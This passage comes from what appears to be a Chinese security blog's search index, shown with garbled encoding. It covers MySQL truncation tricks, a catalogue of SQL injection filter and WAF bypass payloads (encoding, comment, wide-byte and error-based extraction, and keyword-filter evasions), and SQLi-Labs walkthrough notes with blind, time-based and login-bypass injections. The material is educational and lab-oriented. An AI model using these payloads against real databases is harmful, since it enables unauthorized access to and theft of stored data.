2ã€å­—ç¬¦æˆªæ–­åˆ©ç”¨mysqlåœ¨ä½¿ç”¨utf8çš„æ—¶å€™ï¼Œä¸€ä¸ªå­—ç¬¦çš„å¤§å°çš„ä¸Šé™ä¸º3å­—èŠ‚ï¼Œè€Œå½“å‡ºç°å››ä¸ªå­—èŠ‚çš„å­—ç¬¦æ—¶ï¼Œæ˜¯éœ€è¦ç”¨ä½¿ç”¨utf8mb4ç¼–ç ï¼Œä¸ä½¿ç”¨çš„è¯ï¼Œä¼šå°†ä¸è¯†åˆ«çš„å››å­—èŠ‚çš„å­—ç¬¦è¿åŒåé¢çš„å­—ç¬¦ä¸²ä¸€åŒèˆå¼ƒã€‚ æ‰€ä»¥åªè¦æˆ‘ä»¬ä½¿ç”¨ascii&gt;=256çš„ç‰¹æ®Šå­—ç¬¦å°±å¯ä»¥ç»•è¿‡äº†ã€‚ å¦‚ï¼š UPDATE `wp_comments` SET `comment_content` = &apos;adminç‰¹æ®Šå­—ç¬¦123456 &apos; WHERE `wp_comments`.`comment_ID` =12; ä»¥ä¸Šè¯­å¥æ’å…¥åˆ°æ•°æ®åº“çš„å†…å®¹å°±æ˜¯adminäº†ï¼Œåé¢çš„123456è¢«ç‰¹æ®Šå­—ç¬¦æˆªæ–­ã€‚ 3ã€è¶…è¿‡é•¿åº¦æˆªæ–­åˆ©ç”¨å°±æ˜¯åˆ©ç”¨æ•°æ®å®šä¹‰æ—¶ï¼Œå®šä¹‰çš„é•¿åº¦å¤§å°æˆªæ–­ã€‚ å¦‚ï¼š insert into user values (&apos;admin++++++++++++++++123456&apos;,&apos;123456&apos;); ä»¥ä¸Šè¯­å¥ï¼Œå¦‚æœé•¿åº¦é™åˆ¶æ˜¯16ä½ï¼Œé‚£ä¹ˆæ’å…¥åˆ°æ•°æ®åº“ä¸­çš„æ—¶å€™ç”¨æˆ·åçš„123456è¢«æˆªæ–­ ç”¨æˆ·ï¼šadmin å¯†ç ï¼š123456]]></content>
      <tags>
        <tag>WAFç»•è¿‡</tag>
        <tag>MySQL</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLæ³¨å…¥ç»•è¿‡æŠ€å·§]]></title>
    <url>%2F2016%2F08%2F01%2FSQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[SQLæ³¨å…¥æ”»å‡»æ˜¯é»‘å®¢å¯¹æ•°æ®åº“è¿›è¡Œæ”»å‡»çš„å¸¸ç”¨æ‰‹æ®µä¹‹ä¸€ã€‚ç”±äºç¨‹åºå‘˜çš„æ°´å¹³åŠç»éªŒä¹Ÿå‚å·®ä¸é½ï¼Œç›¸å½“å¤§ä¸€éƒ¨åˆ†ç¨‹åºå‘˜åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§è¿›è¡Œåˆ¤æ–­ï¼Œä½¿åº”ç”¨ç¨‹åºå­˜åœ¨å®‰å…¨éšæ‚£ã€‚ç”¨æˆ·å¯ä»¥æäº¤ä¸€æ®µæ•°æ®åº“æŸ¥è¯¢ä»£ç ï¼Œæ ¹æ®ç¨‹åºè¿”å›çš„ç»“æœï¼Œè·å¾—æŸäº›ä»–æƒ³å¾—çŸ¥çš„æ•°æ®ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„SQL Injectionï¼Œå³SQLæ³¨å…¥ã€‚ 0x00 sqlæ³¨å…¥çš„åŸå› sqlæ³¨å…¥çš„åŸå› ï¼Œè¡¨é¢ä¸Šè¯´æ˜¯å› ä¸º æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œæ„æˆsqlè¯­å¥ï¼Œæ²¡æœ‰ä½¿ç”¨ sqlè¯­å¥é¢„ç¼–è¯‘ï¼Œç»‘å®šå˜é‡ã€‚ ä½†æ˜¯æ›´æ·±å±‚æ¬¡çš„åŸå› æ˜¯ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå½“æˆäº† â€œsqlè¯­å¥â€ æ¥æ‰§è¡Œã€‚ æ¯”å¦‚ä¸Šé¢çš„ String sql = â€œselect id,no from user where id=â€ + id;æˆ‘ä»¬å¸Œæœ›ç”¨æˆ·è¾“å…¥çš„ id çš„å€¼ï¼Œä»…ä»…ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²å­—é¢å€¼ï¼Œä¼ å…¥æ•°æ®åº“æ‰§è¡Œï¼Œä½†æ˜¯å½“è¾“å…¥äº†ï¼š 2 or 1=1 æ—¶ï¼Œå…¶ä¸­çš„ or 1=1 å¹¶æ²¡æœ‰ä½œä¸º where id= çš„å­—é¢å€¼ï¼Œè€Œæ˜¯ä½œä¸ºäº† sqlè¯­å¥ æ¥æ‰§è¡Œçš„ã€‚æ‰€ä»¥å…¶æœ¬è´¨æ˜¯å°†ç”¨æˆ·çš„è¾“å…¥çš„æ•°æ®ï¼Œä½œä¸ºäº†å‘½ä»¤æ¥æ‰§è¡Œã€‚ 0x01 sqlæ³¨å…¥ç»•è¿‡1.1 æ³¨é‡Šç¬¦ç»•è¿‡å¸¸ç”¨æ³¨é‡Šç¬¦ï¼š //, -- , /**/, #, --+, -- -, ;,%00,--a UNION /**/ Select /**/userï¼Œpwdï¼Œfrom user U/**/ NION /**/ SE/**/ LECT /**/userï¼Œpwd from user 1.2 å¤§å°å†™ç»•è¿‡?id=1+UnIoN/**/SeLeCT 1.3 å†…è”æ³¨é‡Šç»•è¿‡id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- - é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸Šé¢çš„ä»£ç å¯ä»¥ç»•è¿‡è¿‡æ»¤å™¨ï¼Œè¯·æ³¨æ„ï¼Œæˆ‘ä»¬ç”¨çš„æ˜¯ Likeè€Œä¸æ˜¯ = 1.4 åŒå…³é”®å­—ç»•è¿‡?id=1+UNIunionON+SeLselectECT+1,2,3â€“ 1.5 ç¼–ç ç»•è¿‡å¦‚URLEncodeç¼–ç ï¼ŒASCII,HEX,unicodeç¼–ç ç»•è¿‡ or 1=1å³%6f%72%20%31%3d%31ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸ºCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)ã€‚ åå…­è¿›åˆ¶ç¼–ç  SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) åŒé‡ç¼–ç ç»•è¿‡ ?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+ ä¸€äº›unicodeç¼–ç ä¸¾ä¾‹ï¼š å•å¼•å·ï¼š&apos; %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7 ç©ºç™½ï¼š %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0 å·¦æ‹¬å·(: %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8 å³æ‹¬å·): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9 1.6 ç©ºæ ¼ç»•è¿‡ä¸¤ä¸ªç©ºæ ¼ä»£æ›¿ä¸€ä¸ªç©ºæ ¼ï¼Œç”¨Tabä»£æ›¿ç©ºæ ¼ %20 %09 %0a %0b %0c %0d %a0 /**/ æ‹¬å·ç»•è¿‡ç©ºæ ¼ åœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ select(user())from dual where 1=1 and 2=2; 1.7 ä¸‡èƒ½å¯†é’¥ç»•è¿‡ç”¨ç»å…¸çš„or 1=1åˆ¤æ–­ç»•è¿‡,å¦‚or â€˜swordsâ€™ =â€™swords 1.8 +,-,.å·æ‹†è§£å­—ç¬¦ä¸²ç»•è¿‡?id=1&apos; or &apos;11+11&apos;=&apos;11+11&apos; &quot;-&quot;å’Œ&quot;.&quot; 1.9 likeç»•è¿‡?id=1&apos; or 1 like 1 ç»•è¿‡å¯¹â€œ=â€ï¼Œâ€œ&gt;â€ç­‰çš„è¿‡æ»¤ 2.0 inç»•è¿‡or &apos;1&apos; IN (&apos;swords&apos;) 2.1 &gt;,&lt;ç»•è¿‡or &apos;password&apos; &gt; &apos;pass&apos; or 1&lt;3 2.2 ç­‰ä»·å‡½æ•°ä¸å‘½ä»¤ç»•è¿‡1.å‡½æ•°æˆ–å˜é‡ hex()ã€bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()ã€substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() ä¸¾ä¾‹ï¼šsubstring()å’Œsubstr()æ— æ³•ä½¿ç”¨æ—¶ï¼š?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 æˆ–è€…ï¼š substr((select &apos;password&apos;),1,1) = 0x70 strcmp(left(&apos;password&apos;,1), 0x69) = 1 strcmp(left(&apos;password&apos;,1), 0x70) = 0 strcmp(left(&apos;password&apos;,1), 0x71) = -1 2.ç¬¦å· andå’Œoræœ‰å¯èƒ½ä¸èƒ½ä½¿ç”¨ï¼Œå¯ä»¥è¯•ä¸‹&amp;&amp;å’Œ|| =ä¸èƒ½ä½¿ç”¨çš„æƒ…å†µï¼Œå¯ä»¥è€ƒè™‘å°è¯•&lt;ã€&gt; 3.ç”Ÿåƒ»å‡½æ•° MySQL/PostgreSQLæ”¯æŒXMLå‡½æ•°ï¼šSelect UpdateXML(â€˜&lt;script x=_&gt;&lt;/script&gt; â€™,â€™/script/@x/â€™,â€™src=//evil.comâ€™); ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror)); //postgresql ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1)) and extractvalue(1, concat(0x5c, (select user()),0x5c)) 2.3 åå¼•å·`ç»•è¿‡select `version()`ï¼Œå¯ä»¥ç”¨æ¥è¿‡ç©ºæ ¼å’Œæ­£åˆ™ï¼Œç‰¹æ®Šæƒ…å†µä¸‹è¿˜å¯ä»¥å°†å…¶åšæ³¨é‡Šç¬¦ç”¨ 2.4 æ¢è¡Œç¬¦ç»•è¿‡%0aã€%0d 2.5 æˆªæ–­ç»•è¿‡%00,%0A,?,/0,////////////////........////////,%80-%99 ç›®å½•å­—ç¬¦ä¸²ï¼Œåœ¨windowä¸‹256å­—èŠ‚ã€linuxä¸‹4096å­—èŠ‚æ—¶ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œæœ€å¤§å€¼é•¿åº¦ä¹‹åçš„å­—ç¬¦å°†è¢«ä¸¢å¼ƒã€‚ ././././././././././././././././abc ////////////////////////abc ..1/abc/../1/abc/../1/abc 2.6 å®½å­—èŠ‚ç»•è¿‡è¿‡æ»¤å•å¼•å·æ—¶ï¼Œå¯ä»¥è¯•è¯•å®½å­—èŠ‚ %bf%27 %df%27 %aa%27 2.7 \Nç»•è¿‡\Nå…¶å®ç›¸å½“äºNULLå­—ç¬¦ select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0 2.8 ç‰¹æ®Šçš„ç»•è¿‡å‡½æ•°1. é€šè¿‡greatestå‡½æ•°ç»•è¿‡ä¸èƒ½ä½¿ç”¨å¤§å°äºç¬¦å·çš„æƒ…å†µ greatest(a,b)ï¼Œè¿”å›aå’Œbä¸­è¾ƒå¤§çš„é‚£ä¸ªæ•°ã€‚ å½“æˆ‘ä»¬è¦çŒœè§£user()ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç æ˜¯å¦å°äºç­‰äº150æ—¶ï¼Œå¯ä½¿ç”¨ï¼š mysql&gt; select greatest(ascii(mid(user(),1,1)),150)=150; +------------------------------------------+ | greatest(ascii(mid(user(),1,1)),150)=150 | +------------------------------------------+ | 1 | +------------------------------------------+ å¦‚æœå°äº150ï¼Œåˆ™ä¸Šè¿°è¿”å›å€¼ä¸ºTrueã€‚ 2. é€šè¿‡substrå‡½æ•°ç»•è¿‡ä¸èƒ½ä½¿ç”¨é€—å·çš„æƒ…å†µ mid(user() from 1 for 1) æˆ– substr(user() from 1 for 1) mysql&gt; select ascii(substr(user() from 1 for 1)) &lt; 150; +------------------------------------------+ | ascii(substr(user() from 1 for 1)) &lt; 150 | +------------------------------------------+ | 1 | +------------------------------------------+ 3.ä½¿ç”¨æ•°å­¦è¿ç®—å‡½æ•°åœ¨å­æŸ¥è¯¢ä¸­æŠ¥é”™ exp(x)å‡½æ•°çš„ä½œç”¨ï¼š å–å¸¸æ•°eçš„xæ¬¡æ–¹ï¼Œå…¶ä¸­ï¼Œeæ˜¯è‡ªç„¶å¯¹æ•°çš„åº•ã€‚ ~x æ˜¯ä¸€ä¸ªä¸€å…ƒè¿ç®—ç¬¦ï¼Œå°†xæŒ‰ä½å–è¡¥ select exp(~(select*from(select user())a)) mysqlæŠ¥é”™ï¼š mysql&gt; select exp(~(select*from(select user())a)); ERROR 1690 (22003): DOUBLE value is out of range in â€˜exp(~((select â€˜root@localhostâ€™ from dual)))â€™ è¿™æ¡æŸ¥è¯¢ä¼šå‡ºé”™ï¼Œæ˜¯å› ä¸ºexp(x)çš„å‚æ•°xè¿‡å¤§ï¼Œè¶…è¿‡äº†æ•°å€¼èŒƒå›´ï¼Œåˆ†è§£åˆ°å­æŸ¥è¯¢ï¼Œå°±æ˜¯ï¼š (select*from(select user())a) å¾—åˆ°å­—ç¬¦ä¸² root@localhost è¡¨è¾¾å¼â€™root@localhostâ€™è¢«è½¬æ¢ä¸º0ï¼ŒæŒ‰ä½å–è¡¥ä¹‹åå¾—åˆ°ä¸€ä¸ªéå¸¸çš„å¤§æ•°ï¼Œå®ƒæ˜¯MySQLä¸­æœ€å¤§çš„æ— ç¬¦å·æ•´æ•° é™„ï¼šPHPä¸­ä¸€äº›å¸¸è§çš„è¿‡æ»¤æ–¹æ³•åŠç»•è¿‡æ–¹å¼è¿‡æ»¤å…³é”®å­— and or phpä»£ç  preg_match(&apos;/(and|or)/i&apos;,$id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  1 or 1=1 1 and 1=1 ç»•è¿‡æ–¹å¼ 1 || 1=1 1 &amp;&amp; 1=1 è¿‡æ»¤å…³é”®å­— and or union phpä»£ç  preg_match(&apos;/(and|or|union)/i&apos;,$id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  union select user,password from users ç»•è¿‡æ–¹å¼ 1 &amp;&amp; (select user from users where userid=1)=&apos;admin&apos; è¿‡æ»¤å…³é”®å­— and or union where phpä»£ç  preg_match(&apos;/(and|or|union|where)/i&apos;,$id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos; ç»•è¿‡æ–¹å¼ 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos; è¿‡æ»¤å…³é”®å­— and or union where phpä»£ç  preg_match(&apos;/(and|or|union|where)/i&apos;,$id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos; ç»•è¿‡æ–¹å¼ 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos; è¿‡æ»¤å…³é”®å­— and, or, union, where, limit phpä»£ç  preg_match(&apos;/(and|or|union|where|limit)/i&apos;, $id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos; ç»•è¿‡æ–¹å¼ 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;#user_idèšåˆä¸­user_idä¸º1çš„userä¸ºadmin è¿‡æ»¤å…³é”®å­— and, or, union, where, limit, group by phpä»£ç  preg_match(&apos;/(and|or|union|where|limit|group by)/i&apos;, $id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos; ç»•è¿‡æ–¹å¼ 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1 è¿‡æ»¤å…³é”®å­— and, or, union, where, limit, group by, select phpä»£ç  preg_match(&apos;/(and|or|union|where|limit|group by|select)/i&apos;, $id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1 ç»•è¿‡æ–¹å¼ 1 &amp;&amp; substr(user,1,1) = &apos;a&apos; è¿‡æ»¤å…³é”®å­— and, or, union, where, limit, group by, select, &apos; phpä»£ç  preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;)/i&apos;, $id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1 ç»•è¿‡æ–¹å¼ 1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61) è¿‡æ»¤å…³é”®å­— and, or, union, where, limit, group by, select, &apos;, hex phpä»£ç  preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex)/i&apos;, $id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  1 &amp;&amp; substr(user,1,1) = unhex(61) ç»•è¿‡æ–¹å¼ 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #åè¿›åˆ¶çš„11è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ï¼Œå¹¶å°å†™ã€‚ è¿‡æ»¤å…³é”®å­— and, or, union, where, limit, group by, select, &apos;, hex, substr phpä»£ç  preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr)/i&apos;, $id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt; ç»•è¿‡æ–¹å¼ 1 &amp;&amp; lpad(user,7,1) è¿‡æ»¤å…³é”®å­— and, or, union, where, limit, group by, select, &apos;, hex, substr, ç©ºæ ¼ phpä»£ç  preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr|\s)/i&apos;, $id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  1 &amp;&amp; lpad(user,7,1)/td&gt; ç»•è¿‡æ–¹å¼ 1%0b||%0blpad(user,7,1) è¿‡æ»¤å…³é”®å­— and or union where phpä»£ç  preg_match(&apos;/(and|or|union|where)/i&apos;,$id) ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç  1 || (select user from users where user_id = 1) = &apos;admin&apos; ç»•è¿‡æ–¹å¼ 1 || (select user from users limit 1) = &apos;admin&apos;]]></content>
      <tags>
        <tag>WAFç»•è¿‡</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLi-Labså­¦ä¹ ç¬”è®°]]></title>
    <url>%2F2016%2F07%2F29%2FSQL-Labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼Œä¹Ÿå«åšSQLï¼Œä»æ ¹æœ¬ä¸Šè¯´æ˜¯ä¸€ç§å¤„ç†æ•°æ®åº“çš„ç¼–ç¨‹è¯­è¨€ã€‚å¯¹äºåˆå­¦è€…ï¼Œæ•°æ®åº“ä»…ä»…æ˜¯åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯è¿›è¡Œæ•°æ®å­˜å‚¨ã€‚SQLé€šè¿‡ç»“æ„åŒ–æŸ¥è¯¢ï¼Œå…³ç³»ï¼Œé¢å‘å¯¹è±¡ç¼–ç¨‹ç­‰ç­‰æ¥ç®¡ç†æ•°æ®åº“ã€‚ç¼–ç¨‹æå®¢ä»¬æ€»æ˜¯æå‡ºè®¸å¤šè¿™æ ·ç±»å‹çš„è½¯ä»¶ï¼ŒåƒMySQLï¼ŒMS SQL ,Oracleä»¥åŠPostgresqlã€‚ç°åœ¨æœ‰ä¸€äº›ç¨‹åºèƒ½è®©æˆ‘ä»¬æœ‰èƒ½åŠ›é€šè¿‡ç»“æ„åŒ–æŸ¥è¯¢æ¥ç®¡ç†å¤§å‹æ•°æ®åº“ã€‚ æˆ‘ä»¬å°†è¦ä½¿ç”¨çš„å®éªŒå®¤æ˜¯SQLi Labsï¼Œå®ƒæ˜¯ä¸€ä¸ªå¯ä»¥ä»https://github.com/Audi-1/sqli-labså…è´¹ä¸‹è½½ï¼Œä»¥ä¾¿æˆ‘ä»¬ç ”ç©¶å­¦ä¹ ä»¥åŠç¼–å†™å®‰å…¨çš„ç¨‹åºã€‚ Less-1å…³é”®ä»£ç ï¼š $sql=â€SELECT * FROM users WHERE id=â€™$idâ€™ LIMIT 0,1â€; å¯ä»¥çœ‹åˆ°å¯¹äºç›´æ¥ GET è¿›æ¥çš„æ–‡æœ¬æ²¡æœ‰è¿‡æ»¤ã€‚åŒæ—¶ï¼Œåœ¨æŸ¥è¯¢è¯­å¥ä¸­ï¼Œid=â€™$idâ€™ï¼Œå˜é‡åŠ äº†å¼•å·ã€‚è¿™é‡Œå¼•å·çš„æ„æ€æ˜¯æŠŠè¾“å…¥çš„ id å½“åšå­—ç¬¦ä¸²æ¥å¤„ç†ï¼Œå–ä»å¤´å¼€å§‹çš„æœ€é•¿æ•°å­—ä¸”ç±»å‹è½¬æ¢ä¸ºæ•´å½¢è¿›è¡ŒæŸ¥è¯¢ã€‚ ?id=12a æ˜¾ç¤ºidä¸º12çš„ç”¨æˆ· ?id=1a2a æ˜¾ç¤ºidä¸º1çš„ç”¨æˆ· ?id=102a æ˜¾ç¤ºidä¸º102çš„ç”¨æˆ·ï¼ˆä¸å­˜åœ¨ï¼‰ ç›²æ³¨ ?id=1%27and+left(version(),1)=5%23 å¾—å‡ºæ•°æ®åº“ç‰ˆæœ¬ä¸º5å¼€å¤´ ?id=1%27and+length(database())=8%23 æ•°æ®åº“åé•¿åº¦ä¸º8 ?id=1%27and+left(database(),8)=&apos;security&apos;%23 æ•°æ®åº“ä¸ºsecurity ?id=1%27and+length(username)=4%23 ç”¨æˆ·åé•¿åº¦ä¸º4 ?id=1%27and+left(username,4)=&apos;Dumb&apos;%23 ç”¨æˆ·åä¸ºDumb ?id=1%27and+length(password)=4%23 å¯†ç é•¿åº¦ä¸º4 ?id=1%27and+left(password,4)=&apos;Dumb&apos;%23 å¯†ç ä¸ºDumb Less-2å…³é”®ä»£ç ï¼š $sql=â€SELECT * FROM users WHERE id=$id LIMIT 0,1â€; åŒæ ·æœªåšè¿‡æ»¤ï¼Œä½†æ­¤å¤„çš„å˜é‡ id æ— å¼•å·ã€‚å¤§æ¦‚æ˜¯ç›´æ¥å°†å˜é‡ id å½“åšæ•´å½¢ä¼ å…¥æŸ¥è¯¢ã€‚ ?id=12 æ˜¾ç¤º id ä¸º 12 çš„ç”¨æˆ· ?id=12a æŠ¥é”™ï¼šUnknown column &apos;12a&apos; in &apos;where clause&apos; ?id=%31 æ˜¾ç¤º id ä¸º 1 çš„ç”¨æˆ· æ³¨å…¥æµ‹è¯•ï¼š ?id=1+and+left(version(),1)=5 ç›´æ¥æ³¨å…¥å³å¯å¾—åˆ°ç‰ˆæœ¬å· Less-3å…³é”®ä»£ç ï¼š $sql=â€SELECT * FROM users WHERE id=(â€˜$idâ€™) LIMIT 0,1â€; æœªè¿‡æ»¤ï¼Œä½†å˜é‡ id åŠ äº†å¼•å·å’Œæ‹¬å·ã€‚å°†å˜é‡ id ä»¥å­—ç¬¦ä¸²å½¢å¼å¼•å…¥ï¼Œå’ŒLess-1å¾ˆåƒï¼Œä½†æ˜¯å´åˆå¤šäº†ä¸ªæ‹¬å·ï¼ŒçŒœæµ‹æ˜¯é˜²æ­¢æ³¨å…¥è¯­å¥ã€‚ æ³¨å…¥æµ‹è¯•ï¼š ?id=12+and+1=1 æ˜¾ç¤ºæ­£ç¡® ?id=12+an ä¸å®Œå…¨è¯­å¥ä¹Ÿæ˜¾ç¤ºæ­£ç¡® çŒœæµ‹ï¼šæ‹¬å·å°†å˜é‡é™åˆ¶åœ¨æ‹¬å·èŒƒå›´å†…ï¼Œå°è¯•æ‰‹åŠ¨æå‰åŒ¹é…æ‹¬å·æ³¨å…¥ã€‚ ?id=12%27 æˆåŠŸæŠ¥é”™ï¼š&apos;&apos;12&apos;&apos;) LIMIT 0,1&apos; at line 1 ?id=1%27%29and+1=2%23 æ— æ˜¾ç¤ºï¼Œå¯æ³¨å…¥ ä¸Šé¢é‚£æ¡è¯­å¥è¿˜åŸåˆ° SQL è¯­å¥æ—¶ï¼Œä¸ºï¼š SELECT * FORM users WHERE id=(&apos;1&apos;)and 1=2#&apos;) LIMIT 0,1 å°†æ‹¬å·æå‰ç»“æŸä¸”ç”¨ #å·æ³¨é‡Šæ‰æ¥ä¸‹æ¥çš„è¯­å¥ã€‚æ¥ä¸‹æ¥çš„æ³¨å…¥åªè¦æ›¿æ¢ and 1=1 è¯­å¥å°±è¡Œäº†ã€‚ Less-4å…³é”®ä»£ç ï¼š $id = â€˜â€œâ€˜ . $id . â€˜â€œâ€˜; $sql=â€SELECT * FROM users WHERE id=($id) LIMIT 0,1â€; å¯¹å˜é‡ id åšäº†å¤„ç†ã€‚è¯¥å¤„ç†åœ¨ id å‰åæ·»åŠ åŒå¼•å·ã€‚ ?id=1%22%29+and+1=2%23 æ— æ˜¾ç¤ºï¼Œå¯æ³¨å…¥ SELECT * FROM users WHERE id=(&quot;1&quot;)and 1=2#&quot;) LIMIT 0,1 Less-5å…³é”®ä»£ç ï¼š $sql=â€SELECT * FROM users WHERE id=â€™$idâ€™ LIMIT 0,1â€; ?id=1&apos;and+1=2# Less-6å…³é”®ä»£ç ï¼š $id = â€˜â€œâ€˜.$id.â€™â€â€˜; $sql=â€SELECT * FROM users WHERE id=$id LIMIT 0,1â€; ?id=1&quot;and+1=2# Less-7å…³é”®ä»£ç ï¼š $sql=â€SELECT * FROM users WHERE id=((â€˜$idâ€™)) LIMIT 0,1â€; ?id=1&apos;))and 1=2# Less-8å…³é”®ä»£ç ï¼š $sql=â€SELECT * FROM users WHERE id=â€™$idâ€™ LIMIT 0,1â€; ?id=1&apos; and 1=2# Less-9å°è¯•äº†å¾ˆå¤šæ¬¡ï¼Œå„ç§ç»„åˆï¼Œä½†æ˜¯æœåŠ¡å™¨è¿”å›çš„ç»“æœéƒ½æ˜¯ä¸€æ ·ã€‚å°è¯• ?id=10000000000è¿”å›ç»“æœä¹Ÿæ˜¯æ­£ç¡®ï¼Œå› ä¸ºä¸å­˜åœ¨è¿™ä¹ˆå¤§çš„ idï¼Œæ‰€ä»¥åˆ¤æ–­è¿™ä¸ªé¡µé¢æŠŠæ­£ç¡®å’Œé”™è¯¯çš„ä¿¡æ¯å…¨éƒ¨è¿”å›ä¸€è‡´ã€‚äºæ˜¯ï¼Œä½¿ç”¨åŸºäºæ—¶é—´çš„æ³¨å…¥ï¼Œæ„é€ ä»¥ä¸‹è¯­å¥ï¼š ?id=1&apos; and sleep(5) %23 å¦‚æœé”™è¯¯ï¼Œåˆ™æœåŠ¡å™¨å¤„ç†5ç§’å†è¿”å›ï¼Œå¦åˆ™ç›´æ¥è¿”å›ï¼Œæ‰¾åˆ°æ­£ç¡®çš„æ³¨å…¥ç‚¹ã€‚ ?id=1&apos; and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) %23 ?id=1&apos; and if(ascii(substr(database(),1,1))&gt;114, 0, sleep(5)) %23 ç¬¬ä¸€ä¸ªè¯­å¥æš‚åœäº”ç§’ç¬¬äºŒä¸ªç›´æ¥è¿”å›ï¼Œåˆ¤æ–­æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºsï¼ˆasciiä¸º115ï¼‰ Less-10åˆæ˜¯ä¸€ä¸ªåŸºäºæ—¶é—´çš„æ³¨å…¥ï¼Œå°è¯•äº†ä¸‹ï¼Œæ³¨å…¥ç‚¹åœ¨è¿™ï¼š ?id=1&quot; and sleep(5) %23 Less-11è¿™ä¸ªé¡µé¢é‡‡ç”¨ POST çš„æ–¹æ³•å¾—åˆ°æ•°æ®ã€‚äºæ˜¯ç”¨ HackBar ä¿®æ”¹ post æ•°æ®è¿›è¡Œæµ‹è¯•ï¼š uname=admin&amp;passwd=123&apos; æ˜¾ç¤ºï¼š &apos;&apos;123&apos;&apos; LIMIT 0,1&apos; å»æ‰å•å¼•å· &apos;123&apos;&apos; LIMIT 0,1 å†å»æ‰å¯†ç çš„å•å¼•å· 123&apos; LIMIT 0,1 æ‰€ä»¥ç¡®å®šæ˜¯å•å¼•å·æ³¨å…¥ï¼Œç›´æ¥ä¸‡èƒ½å¯†é’¥è¯•è¯•ï¼š uname=admin&apos; or &apos;1&apos;=&apos;1 &amp;passwd=123456 è¿™é‡Œçš„è¯æœ‰ä¸ªç‚¹ï¼š å¦‚æœè¾“å…¥ï¼šuname=adminâ€™ or â€˜1â€™=â€™1 